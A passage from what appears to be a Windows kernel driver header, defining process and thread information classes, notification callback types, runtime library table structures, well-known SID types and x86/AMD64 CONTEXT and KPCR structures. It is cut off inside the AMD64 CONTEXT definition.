#define PROCESS_EXCEPTION_PORT_ALL_STATE_FLAGS    ((ULONG_PTR)((1UL << PROCESS_EXCEPTION_PORT_ALL_STATE_BITS) - 1))

typedef struct _PROCESS_EXCEPTION_PORT {
  IN HANDLE ExceptionPortHandle;
  IN OUT ULONG StateFlags;
} PROCESS_EXCEPTION_PORT, *PPROCESS_EXCEPTION_PORT;

typedef VOID
(NTAPI *PCREATE_PROCESS_NOTIFY_ROUTINE)(
  IN HANDLE ParentId,
  IN HANDLE ProcessId,
  IN BOOLEAN Create);

typedef struct _PS_CREATE_NOTIFY_INFO {
  IN SIZE_T Size;
  _ANONYMOUS_UNION union {
    IN ULONG Flags;
    _ANONYMOUS_STRUCT struct {
      IN ULONG FileOpenNameAvailable:1;
      IN ULONG Reserved:31;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  IN HANDLE ParentProcessId;
  IN CLIENT_ID CreatingThreadId;
  IN OUT struct _FILE_OBJECT *FileObject;
  IN PCUNICODE_STRING ImageFileName;
  IN PCUNICODE_STRING CommandLine OPTIONAL;
  IN OUT NTSTATUS CreationStatus;
} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;

typedef VOID
(NTAPI *PCREATE_PROCESS_NOTIFY_ROUTINE_EX)(
  IN OUT PEPROCESS Process,
  IN HANDLE ProcessId,
  IN PPS_CREATE_NOTIFY_INFO CreateInfo OPTIONAL);

typedef VOID
(NTAPI *PCREATE_THREAD_NOTIFY_ROUTINE)(
  IN HANDLE ProcessId,
  IN HANDLE ThreadId,
  IN BOOLEAN Create);

#define IMAGE_ADDRESSING_MODE_32BIT       3

typedef struct _IMAGE_INFO {
  _ANONYMOUS_UNION union {
    ULONG Properties;
    _ANONYMOUS_STRUCT struct {
      ULONG ImageAddressingMode:8;
      ULONG SystemModeImage:1;
      ULONG ImageMappedToAllPids:1;
      ULONG ExtendedInfoPresent:1;
      ULONG Reserved:21;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
  PVOID ImageBase;
  ULONG ImageSelector;
  SIZE_T ImageSize;
  ULONG ImageSectionNumber;
} IMAGE_INFO, *PIMAGE_INFO;

typedef struct _IMAGE_INFO_EX {
  SIZE_T Size;
  IMAGE_INFO ImageInfo;
  struct _FILE_OBJECT *FileObject;
} IMAGE_INFO_EX, *PIMAGE_INFO_EX;

typedef VOID
(NTAPI *PLOAD_IMAGE_NOTIFY_ROUTINE)(
  IN PUNICODE_STRING FullImageName,
  IN HANDLE ProcessId,
  IN PIMAGE_INFO ImageInfo);

#define THREAD_CSWITCH_PMU_DISABLE  FALSE
#define THREAD_CSWITCH_PMU_ENABLE   TRUE

#define PROCESS_LUID_DOSDEVICES_ONLY 0x00000001

#define PROCESS_HANDLE_TRACING_MAX_STACKS 16

typedef struct _NT_TIB {
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;
  PVOID StackBase;
  PVOID StackLimit;
  PVOID SubSystemTib;
  _ANONYMOUS_UNION union {
    PVOID FiberData;
    ULONG Version;
  } DUMMYUNIONNAME;
  PVOID ArbitraryUserPointer;
  struct _NT_TIB *Self;
} NT_TIB, *PNT_TIB;

typedef struct _NT_TIB32 {
  ULONG ExceptionList;
  ULONG StackBase;
  ULONG StackLimit;
  ULONG SubSystemTib;
  _ANONYMOUS_UNION union {
    ULONG FiberData;
    ULONG Version;
  } DUMMYUNIONNAME;
  ULONG ArbitraryUserPointer;
  ULONG Self;
} NT_TIB32,*PNT_TIB32;

typedef struct _NT_TIB64 {
  ULONG64 ExceptionList;
  ULONG64 StackBase;
  ULONG64 StackLimit;
  ULONG64 SubSystemTib;
  _ANONYMOUS_UNION union {
    ULONG64 FiberData;
    ULONG Version;
  } DUMMYUNIONNAME;
  ULONG64 ArbitraryUserPointer;
  ULONG64 Self;
} NT_TIB64,*PNT_TIB64;

typedef enum _PROCESSINFOCLASS {
  ProcessBasicInformation,
  ProcessQuotaLimits,
  ProcessIoCounters,
  ProcessVmCounters,
  ProcessTimes,
  ProcessBasePriority,
  ProcessRaisePriority,
  ProcessDebugPort,
  ProcessExceptionPort,
  ProcessAccessToken,
  ProcessLdtInformation,
  ProcessLdtSize,
  ProcessDefaultHardErrorMode,
  ProcessIoPortHandlers,
  ProcessPooledUsageAndLimits,
  ProcessWorkingSetWatch,
  ProcessUserModeIOPL,
  ProcessEnableAlignmentFaultFixup,
  ProcessPriorityClass,
  ProcessWx86Information,
  ProcessHandleCount,
  ProcessAffinityMask,
  ProcessPriorityBoost,
  ProcessDeviceMap,
  ProcessSessionInformation,
  ProcessForegroundInformation,
  ProcessWow64Information,
  ProcessImageFileName,
  ProcessLUIDDeviceMapsEnabled,
  ProcessBreakOnTermination,
  ProcessDebugObjectHandle,
  ProcessDebugFlags,
  ProcessHandleTracing,
  ProcessIoPriority,
  ProcessExecuteFlags,
  ProcessTlsInformation,
  ProcessCookie,
  ProcessImageInformation,
  ProcessCycleTime,
  ProcessPagePriority,
  ProcessInstrumentationCallback,
  ProcessThreadStackAllocation,
  ProcessWorkingSetWatchEx,
  ProcessImageFileNameWin32,
  ProcessImageFileMapping,
  ProcessAffinityUpdateMode,
  ProcessMemoryAllocationMode,
  ProcessGroupInformation,
  ProcessTokenVirtualizationEnabled,
  ProcessConsoleHostProcess,
  ProcessWindowInformation,
  MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef enum _THREADINFOCLASS {
  ThreadBasicInformation,
  ThreadTimes,
  ThreadPriority,
  ThreadBasePriority,
  ThreadAffinityMask,
  ThreadImpersonationToken,
  ThreadDescriptorTableEntry,
  ThreadEnableAlignmentFaultFixup,
  ThreadEventPair_Reusable,
  ThreadQuerySetWin32StartAddress,
  ThreadZeroTlsCell,
  ThreadPerformanceCount,
  ThreadAmILastThread,
  ThreadIdealProcessor,
  ThreadPriorityBoost,
  ThreadSetTlsArrayAddress,
  ThreadIsIoPending,
  ThreadHideFromDebugger,
  ThreadBreakOnTermination,
  ThreadSwitchLegacyState,
  ThreadIsTerminated,
  ThreadLastSystemCall,
  ThreadIoPriority,
  ThreadCycleTime,
  ThreadPagePriority,
  ThreadActualBasePriority,
  ThreadTebInformation,
  ThreadCSwitchMon,
  ThreadCSwitchPmu,
  ThreadWow64Context,
  ThreadGroupInformation,
  ThreadUmsInformation,
  ThreadCounterProfiling,
  ThreadIdealProcessorEx,
  MaxThreadInfoClass
} THREADINFOCLASS;

typedef struct _PAGE_PRIORITY_INFORMATION {
  ULONG PagePriority;
} PAGE_PRIORITY_INFORMATION, *PPAGE_PRIORITY_INFORMATION;

typedef struct _PROCESS_WS_WATCH_INFORMATION {
  PVOID FaultingPc;
  PVOID FaultingVa;
} PROCESS_WS_WATCH_INFORMATION, *PPROCESS_WS_WATCH_INFORMATION;

typedef struct _PROCESS_BASIC_INFORMATION {
  NTSTATUS ExitStatus;
  struct _PEB *PebBaseAddress;
  ULONG_PTR AffinityMask;
  KPRIORITY BasePriority;
  ULONG_PTR UniqueProcessId;
  ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION,*PPROCESS_BASIC_INFORMATION;

typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION {
  SIZE_T Size;
  PROCESS_BASIC_INFORMATION BasicInfo;
  _ANONYMOUS_UNION union {
    ULONG Flags;
    _ANONYMOUS_STRUCT struct {
      ULONG IsProtectedProcess:1;
      ULONG IsWow64Process:1;
      ULONG IsProcessDeleting:1;
      ULONG IsCrossSessionCreate:1;
      ULONG SpareBits:28;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;

typedef struct _PROCESS_DEVICEMAP_INFORMATION {
  _ANONYMOUS_UNION union {
    struct {
      HANDLE DirectoryHandle;
    } Set;
    struct {
      ULONG DriveMap;
      UCHAR DriveType[32];
    } Query;
  } DUMMYUNIONNAME;
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

typedef struct _PROCESS_DEVICEMAP_INFORMATION_EX {
  _ANONYMOUS_UNION union {
    struct {
      HANDLE DirectoryHandle;
    } Set;
    struct {
      ULONG DriveMap;
      UCHAR DriveType[32];
    } Query;
  } DUMMYUNIONNAME;
  ULONG Flags;
} PROCESS_DEVICEMAP_INFORMATION_EX, *PPROCESS_DEVICEMAP_INFORMATION_EX;

typedef struct _PROCESS_SESSION_INFORMATION {
  ULONG SessionId;
} PROCESS_SESSION_INFORMATION, *PPROCESS_SESSION_INFORMATION;

typedef struct _PROCESS_HANDLE_TRACING_ENABLE {
  ULONG Flags;
} PROCESS_HANDLE_TRACING_ENABLE, *PPROCESS_HANDLE_TRACING_ENABLE;

typedef struct _PROCESS_HANDLE_TRACING_ENABLE_EX {
  ULONG Flags;
  ULONG TotalSlots;
} PROCESS_HANDLE_TRACING_ENABLE_EX, *PPROCESS_HANDLE_TRACING_ENABLE_EX;

typedef struct _PROCESS_HANDLE_TRACING_ENTRY {
  HANDLE Handle;
  CLIENT_ID ClientId;
  ULONG Type;
  PVOID Stacks[PROCESS_HANDLE_TRACING_MAX_STACKS];
} PROCESS_HANDLE_TRACING_ENTRY, *PPROCESS_HANDLE_TRACING_ENTRY;

typedef struct _PROCESS_HANDLE_TRACING_QUERY {
  HANDLE Handle;
  ULONG TotalTraces;
  PROCESS_HANDLE_TRACING_ENTRY HandleTrace[1];
} PROCESS_HANDLE_TRACING_QUERY, *PPROCESS_HANDLE_TRACING_QUERY;

extern NTKERNELAPI PEPROCESS PsInitialSystemProcess;


/******************************************************************************
 *                           Runtime Library Types                            *
 ******************************************************************************/

#ifndef _RTL_RUN_ONCE_DEF
#define _RTL_RUN_ONCE_DEF

#define RTL_RUN_ONCE_INIT {0}

#define RTL_RUN_ONCE_CHECK_ONLY     0x00000001UL
#define RTL_RUN_ONCE_ASYNC          0x00000002UL
#define RTL_RUN_ONCE_INIT_FAILED    0x00000004UL

#define RTL_RUN_ONCE_CTX_RESERVED_BITS 2

#define RTL_HASH_ALLOCATED_HEADER            0x00000001

#define RTL_HASH_RESERVED_SIGNATURE 0

/* RtlVerifyVersionInfo() ComparisonType */

#define VER_EQUAL                       1
#define VER_GREATER                     2
#define VER_GREATER_EQUAL               3
#define VER_LESS                        4
#define VER_LESS_EQUAL                  5
#define VER_AND                         6
#define VER_OR                          7

#define VER_CONDITION_MASK              7
#define VER_NUM_BITS_PER_CONDITION_MASK 3

/* RtlVerifyVersionInfo() TypeMask */

#define VER_MINORVERSION                  0x0000001
#define VER_MAJORVERSION                  0x0000002
#define VER_BUILDNUMBER                   0x0000004
#define VER_PLATFORMID                    0x0000008
#define VER_SERVICEPACKMINOR              0x0000010
#define VER_SERVICEPACKMAJOR              0x0000020
#define VER_SUITENAME                     0x0000040
#define VER_PRODUCT_TYPE                  0x0000080

#define VER_NT_WORKSTATION              0x0000001
#define VER_NT_DOMAIN_CONTROLLER        0x0000002
#define VER_NT_SERVER                   0x0000003

#define VER_PLATFORM_WIN32s             0
#define VER_PLATFORM_WIN32_WINDOWS      1
#define VER_PLATFORM_WIN32_NT           2

typedef union _RTL_RUN_ONCE {
  PVOID Ptr;
} RTL_RUN_ONCE, *PRTL_RUN_ONCE;

typedef ULONG /* LOGICAL */
(NTAPI *PRTL_RUN_ONCE_INIT_FN) (
  IN OUT PRTL_RUN_ONCE RunOnce,
  IN OUT PVOID Parameter OPTIONAL,
  IN OUT PVOID *Context OPTIONAL);

#endif /* _RTL_RUN_ONCE_DEF */

typedef enum _TABLE_SEARCH_RESULT {
  TableEmptyTree,
  TableFoundNode,
  TableInsertAsLeft,
  TableInsertAsRight
} TABLE_SEARCH_RESULT;

typedef enum _RTL_GENERIC_COMPARE_RESULTS {
  GenericLessThan,
  GenericGreaterThan,
  GenericEqual
} RTL_GENERIC_COMPARE_RESULTS;

// Forwarder
struct _RTL_AVL_TABLE;

typedef RTL_GENERIC_COMPARE_RESULTS
(NTAPI *PRTL_AVL_COMPARE_ROUTINE) (
  IN struct _RTL_AVL_TABLE *Table,
  IN PVOID FirstStruct,
  IN PVOID SecondStruct);

typedef PVOID
(NTAPI *PRTL_AVL_ALLOCATE_ROUTINE) (
  IN struct _RTL_AVL_TABLE *Table,
  IN CLONG ByteSize);

typedef VOID
(NTAPI *PRTL_AVL_FREE_ROUTINE) (
  IN struct _RTL_AVL_TABLE *Table,
  IN PVOID Buffer);

typedef NTSTATUS
(NTAPI *PRTL_AVL_MATCH_FUNCTION) (
  IN struct _RTL_AVL_TABLE *Table,
  IN PVOID UserData,
  IN PVOID MatchData);

typedef struct _RTL_BALANCED_LINKS {
  struct _RTL_BALANCED_LINKS *Parent;
  struct _RTL_BALANCED_LINKS *LeftChild;
  struct _RTL_BALANCED_LINKS *RightChild;
  CHAR Balance;
  UCHAR Reserved[3];
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE {
  RTL_BALANCED_LINKS BalancedRoot;
  PVOID OrderedPointer;
  ULONG WhichOrderedElement;
  ULONG NumberGenericTableElements;
  ULONG DepthOfTree;
  PRTL_BALANCED_LINKS RestartKey;
  ULONG DeleteCount;
  PRTL_AVL_COMPARE_ROUTINE CompareRoutine;
  PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine;
  PRTL_AVL_FREE_ROUTINE FreeRoutine;
  PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

#ifndef RTL_USE_AVL_TABLES

struct _RTL_GENERIC_TABLE;

typedef RTL_GENERIC_COMPARE_RESULTS
(NTAPI *PRTL_GENERIC_COMPARE_ROUTINE) (
  IN struct _RTL_GENERIC_TABLE *Table,
  IN PVOID FirstStruct,
  IN PVOID SecondStruct);

typedef PVOID
(NTAPI *PRTL_GENERIC_ALLOCATE_ROUTINE) (
  IN struct _RTL_GENERIC_TABLE *Table,
  IN CLONG ByteSize);

typedef VOID
(NTAPI *PRTL_GENERIC_FREE_ROUTINE) (
  IN struct _RTL_GENERIC_TABLE *Table,
  IN PVOID Buffer);

typedef struct _RTL_SPLAY_LINKS {
  struct _RTL_SPLAY_LINKS *Parent;
  struct _RTL_SPLAY_LINKS *LeftChild;
  struct _RTL_SPLAY_LINKS *RightChild;
} RTL_SPLAY_LINKS, *PRTL_SPLAY_LINKS;

typedef struct _RTL_GENERIC_TABLE {
  PRTL_SPLAY_LINKS TableRoot;
  LIST_ENTRY InsertOrderList;
  PLIST_ENTRY OrderedPointer;
  ULONG WhichOrderedElement;
  ULONG NumberGenericTableElements;
  PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine;
  PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine;
  PRTL_GENERIC_FREE_ROUTINE FreeRoutine;
  PVOID TableContext;
} RTL_GENERIC_TABLE, *PRTL_GENERIC_TABLE;

#endif /* !RTL_USE_AVL_TABLES */

#ifdef RTL_USE_AVL_TABLES

#undef PRTL_GENERIC_COMPARE_ROUTINE
#undef RTL_GENERIC_COMPARE_ROUTINE
#undef PRTL_GENERIC_ALLOCATE_ROUTINE
#undef RTL_GENERIC_ALLOCATE_ROUTINE
#undef PRTL_GENERIC_FREE_ROUTINE
#undef RTL_GENERIC_FREE_ROUTINE
#undef RTL_GENERIC_TABLE
#undef PRTL_GENERIC_TABLE

#define PRTL_GENERIC_COMPARE_ROUTINE PRTL_AVL_COMPARE_ROUTINE
#define RTL_GENERIC_COMPARE_ROUTINE RTL_AVL_COMPARE_ROUTINE
#define PRTL_GENERIC_ALLOCATE_ROUTINE PRTL_AVL_ALLOCATE_ROUTINE
#define RTL_GENERIC_ALLOCATE_ROUTINE RTL_AVL_ALLOCATE_ROUTINE
#define PRTL_GENERIC_FREE_ROUTINE PRTL_AVL_FREE_ROUTINE
#define RTL_GENERIC_FREE_ROUTINE RTL_AVL_FREE_ROUTINE
#define RTL_GENERIC_TABLE RTL_AVL_TABLE
#define PRTL_GENERIC_TABLE PRTL_AVL_TABLE

#endif /* RTL_USE_AVL_TABLES */

typedef struct _RTL_DYNAMIC_HASH_TABLE_ENTRY {
  LIST_ENTRY Linkage;
  ULONG_PTR Signature;
} RTL_DYNAMIC_HASH_TABLE_ENTRY, *PRTL_DYNAMIC_HASH_TABLE_ENTRY;

typedef struct _RTL_DYNAMIC_HASH_TABLE_CONTEXT {
  PLIST_ENTRY ChainHead;
  PLIST_ENTRY PrevLinkage;
  ULONG_PTR Signature;
} RTL_DYNAMIC_HASH_TABLE_CONTEXT, *PRTL_DYNAMIC_HASH_TABLE_CONTEXT;

typedef struct _RTL_DYNAMIC_HASH_TABLE_ENUMERATOR {
  RTL_DYNAMIC_HASH_TABLE_ENTRY HashEntry;
  PLIST_ENTRY ChainHead;
  ULONG BucketIndex;
} RTL_DYNAMIC_HASH_TABLE_ENUMERATOR, *PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR;

typedef struct _RTL_DYNAMIC_HASH_TABLE {
  ULONG Flags;
  ULONG Shift;
  ULONG TableSize;
  ULONG Pivot;
  ULONG DivisorMask;
  ULONG NumEntries;
  ULONG NonEmptyBuckets;
  ULONG NumEnumerators;
  PVOID Directory;
} RTL_DYNAMIC_HASH_TABLE, *PRTL_DYNAMIC_HASH_TABLE;

typedef struct _OSVERSIONINFOA {
  ULONG dwOSVersionInfoSize;
  ULONG dwMajorVersion;
  ULONG dwMinorVersion;
  ULONG dwBuildNumber;
  ULONG dwPlatformId;
  CHAR szCSDVersion[128];
} OSVERSIONINFOA, *POSVERSIONINFOA, *LPOSVERSIONINFOA;

typedef struct _OSVERSIONINFOW {
  ULONG dwOSVersionInfoSize;
  ULONG dwMajorVersion;
  ULONG dwMinorVersion;
  ULONG dwBuildNumber;
  ULONG dwPlatformId;
  WCHAR szCSDVersion[128];
} OSVERSIONINFOW, *POSVERSIONINFOW, *LPOSVERSIONINFOW, RTL_OSVERSIONINFOW, *PRTL_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOEXA {
  ULONG dwOSVersionInfoSize;
  ULONG dwMajorVersion;
  ULONG dwMinorVersion;
  ULONG dwBuildNumber;
  ULONG dwPlatformId;
  CHAR szCSDVersion[128];
  USHORT wServicePackMajor;
  USHORT wServicePackMinor;
  USHORT wSuiteMask;
  UCHAR wProductType;
  UCHAR wReserved;
} OSVERSIONINFOEXA, *POSVERSIONINFOEXA, *LPOSVERSIONINFOEXA;

typedef struct _OSVERSIONINFOEXW {
  ULONG dwOSVersionInfoSize;
  ULONG dwMajorVersion;
  ULONG dwMinorVersion;
  ULONG dwBuildNumber;
  ULONG dwPlatformId;
  WCHAR szCSDVersion[128];
  USHORT wServicePackMajor;
  USHORT wServicePackMinor;
  USHORT wSuiteMask;
  UCHAR wProductType;
  UCHAR wReserved;
} OSVERSIONINFOEXW, *POSVERSIONINFOEXW, *LPOSVERSIONINFOEXW, RTL_OSVERSIONINFOEXW, *PRTL_OSVERSIONINFOEXW;

#ifdef UNICODE
typedef OSVERSIONINFOEXW OSVERSIONINFOEX;
typedef POSVERSIONINFOEXW POSVERSIONINFOEX;
typedef LPOSVERSIONINFOEXW LPOSVERSIONINFOEX;
typedef OSVERSIONINFOW OSVERSIONINFO;
typedef POSVERSIONINFOW POSVERSIONINFO;
typedef LPOSVERSIONINFOW LPOSVERSIONINFO;
#else
typedef OSVERSIONINFOEXA OSVERSIONINFOEX;
typedef POSVERSIONINFOEXA POSVERSIONINFOEX;
typedef LPOSVERSIONINFOEXA LPOSVERSIONINFOEX;
typedef OSVERSIONINFOA OSVERSIONINFO;
typedef POSVERSIONINFOA POSVERSIONINFO;
typedef LPOSVERSIONINFOA LPOSVERSIONINFO;
#endif /* UNICODE */

#define HASH_ENTRY_KEY(x)    ((x)->Signature)

/******************************************************************************
 *                            Security Manager Types                          *
 ******************************************************************************/
#define SE_UNSOLICITED_INPUT_PRIVILEGE    6

typedef enum _WELL_KNOWN_SID_TYPE {
  WinNullSid = 0,
  WinWorldSid = 1,
  WinLocalSid = 2,
  WinCreatorOwnerSid = 3,
  WinCreatorGroupSid = 4,
  WinCreatorOwnerServerSid = 5,
  WinCreatorGroupServerSid = 6,
  WinNtAuthoritySid = 7,
  WinDialupSid = 8,
  WinNetworkSid = 9,
  WinBatchSid = 10,
  WinInteractiveSid = 11,
  WinServiceSid = 12,
  WinAnonymousSid = 13,
  WinProxySid = 14,
  WinEnterpriseControllersSid = 15,
  WinSelfSid = 16,
  WinAuthenticatedUserSid = 17,
  WinRestrictedCodeSid = 18,
  WinTerminalServerSid = 19,
  WinRemoteLogonIdSid = 20,
  WinLogonIdsSid = 21,
  WinLocalSystemSid = 22,
  WinLocalServiceSid = 23,
  WinNetworkServiceSid = 24,
  WinBuiltinDomainSid = 25,
  WinBuiltinAdministratorsSid = 26,
  WinBuiltinUsersSid = 27,
  WinBuiltinGuestsSid = 28,
  WinBuiltinPowerUsersSid = 29,
  WinBuiltinAccountOperatorsSid = 30,
  WinBuiltinSystemOperatorsSid = 31,
  WinBuiltinPrintOperatorsSid = 32,
  WinBuiltinBackupOperatorsSid = 33,
  WinBuiltinReplicatorSid = 34,
  WinBuiltinPreWindows2000CompatibleAccessSid = 35,
  WinBuiltinRemoteDesktopUsersSid = 36,
  WinBuiltinNetworkConfigurationOperatorsSid = 37,
  WinAccountAdministratorSid = 38,
  WinAccountGuestSid = 39,
  WinAccountKrbtgtSid = 40,
  WinAccountDomainAdminsSid = 41,
  WinAccountDomainUsersSid = 42,
  WinAccountDomainGuestsSid = 43,
  WinAccountComputersSid = 44,
  WinAccountControllersSid = 45,
  WinAccountCertAdminsSid = 46,
  WinAccountSchemaAdminsSid = 47,
  WinAccountEnterpriseAdminsSid = 48,
  WinAccountPolicyAdminsSid = 49,
  WinAccountRasAndIasServersSid = 50,
  WinNTLMAuthenticationSid = 51,
  WinDigestAuthenticationSid = 52,
  WinSChannelAuthenticationSid = 53,
  WinThisOrganizationSid = 54,
  WinOtherOrganizationSid = 55,
  WinBuiltinIncomingForestTrustBuildersSid = 56,
  WinBuiltinPerfMonitoringUsersSid = 57,
  WinBuiltinPerfLoggingUsersSid = 58,
  WinBuiltinAuthorizationAccessSid = 59,
  WinBuiltinTerminalServerLicenseServersSid = 60,
  WinBuiltinDCOMUsersSid = 61,
  WinBuiltinIUsersSid = 62,
  WinIUserSid = 63,
  WinBuiltinCryptoOperatorsSid = 64,
  WinUntrustedLabelSid = 65,
  WinLowLabelSid = 66,
  WinMediumLabelSid = 67,
  WinHighLabelSid = 68,
  WinSystemLabelSid = 69,
  WinWriteRestrictedCodeSid = 70,
  WinCreatorOwnerRightsSid = 71,
  WinCacheablePrincipalsGroupSid = 72,
  WinNonCacheablePrincipalsGroupSid = 73,
  WinEnterpriseReadonlyControllersSid = 74,
  WinAccountReadonlyControllersSid = 75,
  WinBuiltinEventLogReadersGroup = 76,
  WinNewEnterpriseReadonlyControllersSid = 77,
  WinBuiltinCertSvcDComAccessGroup = 78,
  WinMediumPlusLabelSid = 79,
  WinLocalLogonSid = 80,
  WinConsoleLogonSid = 81,
  WinThisOrganizationCertificateSid = 82,
} WELL_KNOWN_SID_TYPE;

#if defined(_M_IX86)

#define PAUSE_PROCESSOR YieldProcessor();

#define KERNEL_STACK_SIZE                   12288
#define KERNEL_LARGE_STACK_SIZE             61440
#define KERNEL_LARGE_STACK_COMMIT           12288

#define SIZE_OF_80387_REGISTERS   80

#if !defined(RC_INVOKED)

#define CONTEXT_i386               0x10000
#define CONTEXT_i486               0x10000
#define CONTEXT_CONTROL            (CONTEXT_i386|0x00000001L)
#define CONTEXT_INTEGER            (CONTEXT_i386|0x00000002L)
#define CONTEXT_SEGMENTS           (CONTEXT_i386|0x00000004L)
#define CONTEXT_FLOATING_POINT     (CONTEXT_i386|0x00000008L)
#define CONTEXT_DEBUG_REGISTERS    (CONTEXT_i386|0x00000010L)
#define CONTEXT_EXTENDED_REGISTERS (CONTEXT_i386|0x00000020L)

#define CONTEXT_FULL (CONTEXT_CONTROL|CONTEXT_INTEGER|CONTEXT_SEGMENTS)
#define CONTEXT_ALL (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |  \
                     CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS |      \
                     CONTEXT_EXTENDED_REGISTERS)

#define CONTEXT_XSTATE          (CONTEXT_i386 | 0x00000040L)

#endif /* !defined(RC_INVOKED) */

typedef struct _FLOATING_SAVE_AREA {
  ULONG ControlWord;
  ULONG StatusWord;
  ULONG TagWord;
  ULONG ErrorOffset;
  ULONG ErrorSelector;
  ULONG DataOffset;
  ULONG DataSelector;
  UCHAR RegisterArea[SIZE_OF_80387_REGISTERS];
  ULONG Cr0NpxState;
} FLOATING_SAVE_AREA, *PFLOATING_SAVE_AREA;

#include "pshpack4.h"
typedef struct _CONTEXT {
  ULONG ContextFlags;
  ULONG Dr0;
  ULONG Dr1;
  ULONG Dr2;
  ULONG Dr3;
  ULONG Dr6;
  ULONG Dr7;
  FLOATING_SAVE_AREA FloatSave;
  ULONG SegGs;
  ULONG SegFs;
  ULONG SegEs;
  ULONG SegDs;
  ULONG Edi;
  ULONG Esi;
  ULONG Ebx;
  ULONG Edx;
  ULONG Ecx;
  ULONG Eax;
  ULONG Ebp;
  ULONG Eip;
  ULONG SegCs;
  ULONG EFlags;
  ULONG Esp;
  ULONG SegSs;
  UCHAR ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
} CONTEXT;
#include "poppack.h"

#define KeGetPcr()                      PCR

#define PCR_MINOR_VERSION 1
#define PCR_MAJOR_VERSION 1

typedef struct _KPCR {
  union {
    NT_TIB NtTib;
    struct {
      struct _EXCEPTION_REGISTRATION_RECORD *Used_ExceptionList;
      PVOID Used_StackBase;
      PVOID Spare2;
      PVOID TssCopy;
      ULONG ContextSwitches;
      KAFFINITY SetMemberCopy;
      PVOID Used_Self;
    };
  };
  struct _KPCR *SelfPcr;
  struct _KPRCB *Prcb;
  KIRQL Irql;
  ULONG IRR;
  ULONG IrrActive;
  ULONG IDR;
  PVOID KdVersionBlock;
  struct _KIDTENTRY *IDT;
  struct _KGDTENTRY *GDT;
  struct _KTSS *TSS;
  USHORT MajorVersion;
  USHORT MinorVersion;
  KAFFINITY SetMember;
  ULONG StallScaleFactor;
  UCHAR SpareUnused;
  UCHAR Number;
  UCHAR Spare0;
  UCHAR SecondLevelCacheAssociativity;
  ULONG VdmAlert;
  ULONG KernelReserved[14];
  ULONG SecondLevelCacheSize;
  ULONG HalReserved[16];
} KPCR, *PKPCR;

FORCEINLINE
ULONG
KeGetCurrentProcessorNumber(VOID)
{
    return (ULONG)__readfsbyte(FIELD_OFFSET(KPCR, Number));
}


extern NTKERNELAPI PVOID MmHighestUserAddress;
extern NTKERNELAPI PVOID MmSystemRangeStart;
extern NTKERNELAPI ULONG MmUserProbeAddress;

#define MM_HIGHEST_USER_ADDRESS MmHighestUserAddress
#define MM_SYSTEM_RANGE_START MmSystemRangeStart
#if defined(_LOCAL_COPY_USER_PROBE_ADDRESS_)
#define MM_USER_PROBE_ADDRESS _LOCAL_COPY_USER_PROBE_ADDRESS_
extern ULONG _LOCAL_COPY_USER_PROBE_ADDRESS_;
#else
#define MM_USER_PROBE_ADDRESS MmUserProbeAddress
#endif
#define MM_LOWEST_USER_ADDRESS (PVOID)0x10000
#define MM_KSEG0_BASE       MM_SYSTEM_RANGE_START
#define MM_SYSTEM_SPACE_END 0xFFFFFFFF
#if !defined (_X86PAE_)
#define MM_LOWEST_SYSTEM_ADDRESS (PVOID)0xC0800000
#else
#define MM_LOWEST_SYSTEM_ADDRESS (PVOID)0xC0C00000
#endif

#elif defined(_M_AMD64)

#define PAUSE_PROCESSOR YieldProcessor();

#define KERNEL_STACK_SIZE 0x6000
#define KERNEL_LARGE_STACK_SIZE 0x12000
#define KERNEL_LARGE_STACK_COMMIT KERNEL_STACK_SIZE

#define KERNEL_MCA_EXCEPTION_STACK_SIZE 0x2000

#define EXCEPTION_READ_FAULT    0
#define EXCEPTION_WRITE_FAULT   1
#define EXCEPTION_EXECUTE_FAULT 8

#if !defined(RC_INVOKED)

#define CONTEXT_AMD64 0x100000

#define CONTEXT_CONTROL (CONTEXT_AMD64 | 0x1L)
#define CONTEXT_INTEGER (CONTEXT_AMD64 | 0x2L)
#define CONTEXT_SEGMENTS (CONTEXT_AMD64 | 0x4L)
#define CONTEXT_FLOATING_POINT (CONTEXT_AMD64 | 0x8L)
#define CONTEXT_DEBUG_REGISTERS (CONTEXT_AMD64 | 0x10L)

#define CONTEXT_FULL (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT)
#define CONTEXT_ALL (CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS)

#define CONTEXT_XSTATE (CONTEXT_AMD64 | 0x20L)

#define CONTEXT_EXCEPTION_ACTIVE 0x8000000
#define CONTEXT_SERVICE_ACTIVE 0x10000000
#define CONTEXT_EXCEPTION_REQUEST 0x40000000
#define CONTEXT_EXCEPTION_REPORTING 0x80000000

#endif /* !defined(RC_INVOKED) */

#define INITIAL_MXCSR                  0x1f80
#define INITIAL_FPCSR                  0x027f

typedef struct DECLSPEC_ALIGN(16) _CONTEXT {
  ULONG64 P1Home;
  ULONG64 P2Home;
  ULONG64 P3Home;
  ULONG64 P4Home;
  ULONG64 P5Home;
  ULONG64 P6Home;
  ULONG ContextFlags;
  ULONG MxCsr;
  USHORT SegCs;
  USHORT SegDs;
  USHORT SegEs;
  USHORT SegFs;
  USHORT SegGs;
  USHORT SegSs;
  ULONG EFlags;
  ULONG64 Dr0;
